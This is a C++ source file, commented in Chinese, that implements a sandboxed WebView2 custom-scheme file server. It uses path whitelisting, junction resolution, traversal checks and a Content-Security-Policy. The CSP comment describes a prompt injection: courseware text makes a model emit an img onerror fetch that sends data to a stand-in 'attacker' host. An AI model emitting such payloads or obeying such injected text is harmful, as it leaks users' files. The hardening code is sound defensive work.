#include "protocol.h"

#include "../util/file_ops.h"
#include "../util/log.h"
#include "../util/str_util.h"
#include "../util/win_util.h"

#include <shlwapi.h>
#include <WebView2EnvironmentOptions.h>   // CoreWebView2CustomSchemeRegistration（不在 WebView2.h 里）
#include <wrl.h>

#include <algorithm>
#include <map>
#include <set>

namespace isg {

namespace {

constexpr wchar_t kScheme[] = L"isg";
constexpr wchar_t kHost[] = L"local";

/* 允许被读取的根目录（**已归一化**：绝对路径、小写、无尾随分隔符）。
   ⚠️ 这里必须存"归一化过的"路径：oracle 踩过一个坑 —— 白名单存的是用户原样给的串
   （可能是相对路径、可能是 `C:\Out` 而请求解析出的是 `c:\out`），
   于是前缀比较永远不成立、**页面自己的文档请求被判 403**，
   报错还指向"协议有问题"。Windows 上大小写不敏感，所以比较前统一小写。 */
std::set<std::wstring> g_roots;       // 词法根
std::set<std::wstring> g_rootsReal;   // 真实路径根（解析过 junction / 符号链接）

ProtocolStats g_stats;


std::wstring norm(const std::wstring& p) {
    wchar_t full[32768] = {};
    const DWORD n = ::GetFullPathNameW(p.c_str(), static_cast<DWORD>(std::size(full)), full, nullptr);
    std::wstring out = (n > 0 && n < std::size(full)) ? std::wstring(full) : p;
    // 去尾随分隔符（`C:\` 这种根除外）
    while (out.size() > 3 && (out.back() == L'\\' || out.back() == L'/')) out.pop_back();
    std::transform(out.begin(), out.end(), out.begin(),
                   [](wchar_t c) { return (c >= L'A' && c <= L'Z') ? static_cast<wchar_t>(c - L'A' + L'a') : c; });
    return out;
}

/* 真实路径：**按句柄反查**，而不是再拼一遍字符串。
   纲领 §5 遗留 7 点名了这一条：oracle 的 preview.js 只做"词法前缀 + realpath 前缀"两遍比较，
   而 `GetFullPathNameW` **不解析重解析点** —— 放行目录里只要有一个指向外部的 junction，
   `dir\link\secret.txt` 词法上仍在 `dir\` 之下、检查通过、CreateFileW 却真读到外面。
   用 GetFinalPathNameByHandleW 反查，拿到的是"打开这个句柄实际会落到哪里"。 */
bool try_real_path(const std::wstring& p, std::wstring& out) {
    HANDLE h = ::CreateFileW(p.c_str(), 0,
                             FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                             nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;
    std::vector<wchar_t> buf(32768);
    const DWORD n = ::GetFinalPathNameByHandleW(h, buf.data(), static_cast<DWORD>(buf.size()),
                                                FILE_NAME_NORMALIZED | VOLUME_NAME_DOS);
    ::CloseHandle(h);
    if (n == 0 || n >= buf.size()) return false;
    std::wstring s(buf.data(), n);
    // 返回值形如 `\\?\C:\dir\file`（UNC 是 `\\?\UNC\server\share\...`），把前缀剥掉
    if (s.rfind(L"\\\\?\\UNC\\", 0) == 0) {
        s = L"\\\\" + s.substr(8);
    } else if (s.rfind(L"\\\\?\\", 0) == 0) {
        s = s.substr(4);
    }
    out = norm(s);
    return true;
}

bool under_any_root(const std::wstring& n) {
    auto hit = [&](const std::set<std::wstring>& roots) {
        for (const std::wstring& r : roots) {
            if (n == r) return true;
            if (n.size() > r.size() && n.compare(0, r.size(), r) == 0) {
                const wchar_t c = n[r.size()];
                if (c == L'\\' || c == L'/') return true;
            }
        }
        return false;
    };
    return hit(g_roots) || hit(g_rootsReal);
}

/* 解码**之后**每一段长什么样才算合法。
   为什么要在"段"这一层判、而不是在拼好的路径上判：段是 URL 的语义单位，
   而 `%2e%2e%2f` 这类写法解码回来就是一段里塞了分隔符 —— 在拼好的路径上看，
   它和"真的写了一个 .."长得一样，分不出来是谁干的。 */
bool segment_is_legal(const std::wstring& seg, bool first) {
    if (seg.empty()) return false;
    // 解码之后还带分隔符 = URL 想往里注入分隔符（UNC、设备路径、根相对都撞在这条上）
    if (seg.find(L'\\') != std::wstring::npos || seg.find(L'/') != std::wstring::npos) return false;
    if (seg == L"." || seg == L"..") return false;
    const size_t colon = seg.find(L':');
    if (colon == std::wstring::npos) return true;
    /* 冒号只允许出现在**第一段的盘符**上。别处出现就意味着：
       · `file.txt:secret` —— NTFS 数据流，同一个文件换个流名就能读到别的东西；
       · `C:\Windows` —— 驱动器绝对路径（第二段起出现就等于把拼接结果顶掉了）。 */
    if (!first) return false;
    if (seg.size() != 2) return false;
    const wchar_t c = seg[0];
    const bool alpha = (c >= L'A' && c <= L'Z') || (c >= L'a' && c <= L'z');
    return alpha && seg[1] == L':';
}

void serve_text(ICoreWebView2WebResourceRequestedEventArgs* args,
                ICoreWebView2Environment* env, int status, const wchar_t* reason, const char* body) {
    if (env == nullptr) return;
    IStream* stream = ::SHCreateMemStream(reinterpret_cast<const BYTE*>(body),
                                          static_cast<UINT>(std::char_traits<char>::length(body)));
    if (stream == nullptr) return;
    ComPtr<ICoreWebView2WebResourceResponse> response;
    if (SUCCEEDED(env->CreateWebResourceResponse(stream, status, reason, L"", &response))) {
        args->put_Response(response.Get());
    }
    stream->Release();
}

const wchar_t* mime_for(const std::wstring& ext) {
    if (ext == L".html" || ext == L".htm") return L"text/html; charset=utf-8";
    if (ext == L".js") return L"text/javascript; charset=utf-8";
    if (ext == L".json") return L"application/json; charset=utf-8";
    if (ext == L".css") return L"text/css; charset=utf-8";
    if (ext == L".png") return L"image/png";
    if (ext == L".jpg" || ext == L".jpeg") return L"image/jpeg";
    if (ext == L".webp") return L"image/webp";
    if (ext == L".svg") return L"image/svg+xml";
    if (ext == L".txt" || ext == L".md") return L"text/plain; charset=utf-8";
    if (ext == L".pdf") return L"application/pdf";
    return L"application/octet-stream";
}

std::wstring lower_ext(const std::wstring& path) {
    const size_t dot = path.find_last_of(L'.');
    if (dot == std::wstring::npos) return std::wstring();
    std::wstring ext = path.substr(dot);
    std::transform(ext.begin(), ext.end(), ext.begin(),
                   [](wchar_t c) { return (c >= L'A' && c <= L'Z') ? static_cast<wchar_t>(c - L'A' + L'a') : c; });
    return ext;
}

/* CSP：**安全审计的第一优先项**。
   被 isg:// 服务的页面里，HTML 是模型写的，而模型读的是用户课件 ——
   课件里一句"原样输出下面的标签"就能让它写出
   `<img src=x onerror="fetch('https://attacker/?d='+...)">`。
   这道头 + iframe 的 sandbox 收窄 + assemble 的 HTML 清洗，三层互补：
   清洗挡不住"演示必须有 JS"，CSP 挡不住"同源读文件"（那条由白名单管），
   白名单挡不住"把读到的内容发出去"—— CSP 管这个。
   ⚠️ 与 oracle 的 preview.js 逐字一致，别"顺手收紧"：收紧一处就可能让生成页的
   内联脚本或同目录图片挂掉，而症状是"页面看着没问题、图没了"。 */
const wchar_t* kCsp =
    L"default-src 'none'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; "
    L"img-src 'self' data: blob:; font-src 'self' data:; media-src 'self' data:; "
    L"connect-src 'none'; frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'";

}  // namespace

bool protocol_register_scheme(ICoreWebView2EnvironmentOptions* options) {
    /* 每个 environment 都要登记一次 —— **不做"只登记一次"的短路**。
       第一版有 `if (g_schemeRegistered) return true;`，于是第二个 environment
       （离屏探针窗口）拿到的 options 上什么都没登记，它里面的 isg:// 请求直接失败，
       而症状是"探针窗口打不开页面"——看起来像探针的问题，其实是协议没装。 */
    if (options == nullptr) return false;
    ComPtr<ICoreWebView2EnvironmentOptions4> opt4;
    if (FAILED(options->QueryInterface(IID_PPV_ARGS(&opt4))) || opt4 == nullptr) {
        log_error("WebView2 SDK 不支持自定义 scheme 登记（缺 ICoreWebView2EnvironmentOptions4）");
        return false;
    }
    auto reg = Microsoft::WRL::Make<CoreWebView2CustomSchemeRegistration>(kScheme);
    if (!reg) return false;
    /* TreatAsSecure：让 isg:// 被当成可信来源（否则 file:// 的父页加载它会被当混合内容挡掉）。
       HasAuthorityComponent：让 `isg://local/…` 里的 `local` 是 authority、其余是 path ——
       这一步决定了 `urlFor` 拼出来的形态和解回来时的分段方式，必须与 oracle 一致。 */
    reg->put_TreatAsSecure(TRUE);
    reg->put_HasAuthorityComponent(TRUE);
    ICoreWebView2CustomSchemeRegistration* raw = reg.Get();
    if (FAILED(opt4->SetCustomSchemeRegistrations(1, &raw))) {
        log_error("登记自定义 scheme 失败");
        return false;
    }
    /* 每个 environment 都要登记一次 —— 所以这里**不做"只登记一次"的短路**。
       一条 design 上的教训：第一版有 `if (g_schemeRegistered) return true;`，
       于是第二个 environment（离屏探针窗口）拿到的 options 上什么都没登记，
       它里面的 isg:// 请求会直接失败。 */
    g_stats.schemesRegistered++;
    return true;
}

bool protocol_install(ICoreWebView2* webview) {
    /* 同样不短路：**每个 webview 各装一次**（主窗口一个、探针窗口一个）。 */
    if (webview == nullptr) return false;
    const HRESULT hr = webview->AddWebResourceRequestedFilter(L"isg://*", COREWEBVIEW2_WEB_RESOURCE_CONTEXT_ALL);
    g_stats.filterHr = hr;
    if (FAILED(hr)) {
        log_error("AddWebResourceRequestedFilter 失败（filterHr=0x"
                  + std::to_string(static_cast<unsigned long>(hr)) + "）");
        return false;
    }
    EventRegistrationToken token{};
    const HRESULT hr2 = webview->add_WebResourceRequested(
        Microsoft::WRL::Callback<ICoreWebView2WebResourceRequestedEventHandler>(
            [](ICoreWebView2* sender, ICoreWebView2WebResourceRequestedEventArgs* args) -> HRESULT {
                g_stats.wrcAll++;
                ComPtr<ICoreWebView2WebResourceRequest> request;
                if (FAILED(args->get_Request(&request)) || !request) return S_OK;
                LPWSTR uriRaw = nullptr;
                if (FAILED(request->get_Uri(&uriRaw)) || uriRaw == nullptr) return S_OK;
                const std::wstring uri(uriRaw);
                ::CoTaskMemFree(uriRaw);

                /* `get_Environment` 挂在 **ICoreWebView2_2** 上，不在基础接口上。 */
                ComPtr<ICoreWebView2_2> wv2;
                if (FAILED(sender->QueryInterface(IID_PPV_ARGS(&wv2))) || !wv2) return S_OK;
                ComPtr<ICoreWebView2Environment> env;
                if (FAILED(wv2->get_Environment(&env))) return S_OK;

                // isg://local/<...>：只认我们这一个 authority
                const std::wstring prefix = std::wstring(kScheme) + L"://" + kHost + L"/";
                if (uri.rfind(prefix, 0) != 0) {
                    serve_text(args, env.Get(), 404, L"Not Found", "not found");
                    return S_OK;
                }
                std::wstring disk;
                std::string why;
                if (!protocol_disk_path_from_url(to_utf8(uri), disk, why)) {
                    g_stats.deniedCount++;
                    if (g_stats.deniedSample.empty()) g_stats.deniedSample = to_utf8(uri);
                    log_warn("[isg://] 拒绝形态非法的路径（" + why + "）：" + to_utf8(uri));
                    serve_text(args, env.Get(), 403, L"Forbidden", "forbidden");
                    return S_OK;
                }

                const std::wstring abs = norm(disk);
                if (!protocol_is_allowed(abs)) {
                    /* 这条日志很重要：出现它说明有页面在请求一个我们没放行的路径 */
                    g_stats.deniedCount++;
                    if (g_stats.deniedSample.empty()) g_stats.deniedSample = to_utf8(uri);
                    log_warn("[isg://] 拒绝未授权的路径：" + to_utf8(abs));
                    serve_text(args, env.Get(), 403, L"Forbidden", "forbidden");
                    return S_OK;
                }

                const FileInfo info = stat_path(abs);
                if (info.isDir) {
                    // 目录请求：给一份清单，方便排查"图片为什么没加载"
                    std::string body = "{\n \"dir\": \"" + json_quote(to_utf8(abs)) + "\",\n \"files\": [";
                    const std::vector<std::wstring> names = list_dir(abs);
                    const size_t max = names.size() > 200 ? 200 : names.size();
                    for (size_t i = 0; i < max; ++i) {
                        if (i) body += ", ";
                        body += json_quote(to_utf8(names[i]));
                    }
                    body += "]}\n";
                    serve_text(args, env.Get(), 200, L"OK", body.c_str());
                    return S_OK;
                }
                if (!info.exists) {
                    serve_text(args, env.Get(), 404, L"Not Found", "not found");
                    return S_OK;
                }

                std::string bytes;
                if (!read_file_bytes(abs, bytes)) {
                    serve_text(args, env.Get(), 404, L"Not Found", "not found");
                    return S_OK;
                }

                const std::wstring ext = lower_ext(abs);
                std::wstring headers = L"Content-Type: ";
                headers += mime_for(ext);
                headers += L"\r\nCache-Control: no-store";
                const bool isHtml = (ext == L".html" || ext == L".htm");
                if (isHtml) {
                    headers += L"\r\nContent-Security-Policy: ";
                    headers += kCsp;
                }
                // 跨源（父页是 file://）：显式放开，免得将来加 fetch 时被 CORS 挡
                headers += L"\r\nAccess-Control-Allow-Origin: *";

                IStream* stream = ::SHCreateMemStream(
                    reinterpret_cast<const BYTE*>(bytes.data()), static_cast<UINT>(bytes.size()));
                if (stream == nullptr) return S_OK;
                ComPtr<ICoreWebView2WebResourceResponse> response;
                if (SUCCEEDED(env->CreateWebResourceResponse(stream, 200, L"OK", headers.c_str(), &response))) {
                    args->put_Response(response.Get());
                    g_stats.docRequestSeen++;
                    g_stats.docResponseServed++;
                    g_stats.docBytesServed += static_cast<int>(bytes.size());
                    g_stats.lastDocUrl = to_utf8(uri);
                    if (isHtml) g_stats.cspHeaderSent = true;
                }
                stream->Release();
                return S_OK;
            }).Get(), &token);
    if (FAILED(hr2)) {
        log_error("add_WebResourceRequested 失败");
        return false;
    }
    return true;
}

bool protocol_disk_path_from_url(const std::string& url, std::wstring& disk, std::string& why) {
    why.clear();
    const std::wstring prefix = std::wstring(kScheme) + L"://" + kHost + L"/";
    const std::wstring wurl = to_wide(url);
    if (wurl.rfind(prefix, 0) != 0) {
        why = "不是 isg://" + to_utf8(kHost) + "/ 开头的地址";
        return false;
    }
    const std::string pathname = url.substr(to_utf8(prefix).size() - 1);   // 保留开头的 '/'
    std::vector<std::wstring> segs;
    for (const std::string& s : split(pathname, '/')) {
        if (!s.empty()) segs.push_back(to_wide(uri_component_decode(s)));
    }
    if (segs.empty()) {
        why = "没有给出路径";
        return false;
    }
    for (size_t i = 0; i < segs.size(); ++i) {
        if (!segment_is_legal(segs[i], i == 0)) {
            why = "第 " + std::to_string(i + 1) + " 段形态非法";
            return false;
        }
    }
    /* 第一段**必须**是盘符。少了这一条，`isg://local/other/plain.html` 会被拼成一个
       **相对路径** `other\plain.html` —— 而相对路径会锚到进程的当前工作目录，
       于是同一个 URL 在不同工作目录下指向不同的文件（白名单仍然会拦，但这一层
       本来就不该放它过去）。Windows 上的 `urlFor` 永远产出盘符开头，所以这是恒成立的约束。 */
    if (segs[0].size() != 2 || segs[0][1] != L':') {
        why = "第一段不是盘符（路径必须是绝对的）";
        return false;
    }
    // 只有盘符那一支会走到这里；其余形态在 segment_is_legal 就拒掉了
    // （"根相对路径"曾经单独有一支兜底，现在被"解码后不许带分隔符"覆盖了）。
    std::wstring joined = segs[0] + L"\\";
    for (size_t i = 1; i < segs.size(); ++i) {
        if (i > 1) joined += L"\\";
        joined += segs[i];
    }
    disk = joined;
    return true;
}

void protocol_allow(const std::wstring& target) {
    if (target.empty()) return;
    std::wstring dir = target;
    const FileInfo info = stat_path(dir);
    if (info.isFile) dir = parent_dir(dir);
    g_roots.insert(norm(dir));
    std::wstring real;
    if (try_real_path(dir, real)) g_rootsReal.insert(real);
}

bool protocol_is_allowed(const std::wstring& absPath) {
    const std::wstring n = norm(absPath);
    if (!under_any_root(n)) return false;      // 词法上就在外面 → 直接拒
    std::wstring real;
    if (!try_real_path(absPath, real)) return true;   // 打不开（多半是不存在）→ 让上层报 404
    return under_any_root(real);               // 真实路径也得在根里，junction / 符号链接卡在这
}

std::string protocol_url_for(const std::wstring& absPath) {
    const std::wstring abs = norm(absPath);
    // 每个路径段单独编码：不能整体 encodeURIComponent，否则盘符里的 ':' 与分隔符都会被吃掉。
    // 段首那个空段要去掉（norm 出来的绝对路径以分隔符开头）。
    std::vector<std::string> segs;
    for (const std::wstring& part : [&] {
             std::vector<std::wstring> v;
             std::wstring cur;
             for (const wchar_t c : abs) {
                 if (c == L'\\' || c == L'/') {
                     if (!cur.empty()) { v.push_back(cur); cur.clear(); }
                 } else {
                     cur.push_back(c);
                 }
             }
             if (!cur.empty()) v.push_back(cur);
             return v;
         }()) {
        segs.push_back(uri_component_encode(to_utf8(part)));
    }
    return to_utf8(std::wstring(kScheme)) + "://" + to_utf8(std::wstring(kHost)) + "/" + join(segs, "/");
}

void protocol_reset() {
    g_roots.clear();
    g_rootsReal.clear();
    g_stats = ProtocolStats{};
}

const ProtocolStats& protocol_stats() { return g_stats; }

}  // namespace isg
